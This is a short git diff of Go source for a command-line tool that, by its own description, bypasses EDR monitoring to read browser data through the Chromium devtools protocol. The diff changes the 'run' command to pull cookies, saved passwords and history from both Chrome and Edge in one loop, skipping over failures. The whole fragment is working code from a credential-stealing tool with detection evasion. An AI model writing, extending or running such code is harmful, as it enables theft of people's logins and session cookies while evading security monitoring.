@@ -48,19 +48,16 @@ bypass edr monitor of browser data file by using Chromium devtools protocol`,
 
 	runCmd := &cobra.Command{
 		Use:   "run",
-		Short: "Parse browser cookie, password and history",
+		Short: "Parse all browser cookie, password and history",
 		RunE: func(cmd *cobra.Command, args []string) error {
-			err := runE(targetBrowser, item.Password, masterKeyFile, "", "", outputFormat, kill)
-			if err != nil {
-				return err
-			}
-			err = runE(targetBrowser, item.History, masterKeyFile, "", "", outputFormat, kill)
-			if err != nil {
-				return err
-			}
-			err = runE(targetBrowser, item.Cookie, masterKeyFile, "", "", outputFormat, kill)
-			if err != nil {
-				return err
+			for _, b := range []string{item.Chrome, item.Edge} {
+				for _, t := range []string{item.Cookie, item.Password, item.History} {
+					err := runE(b, t, masterKeyFile, "", "", outputFormat, kill)
+					if err != nil {
+						log.Infof("get %s for %s failed: ", t, b)
+					}
+				}
+
 			}
 			return nil
 		},
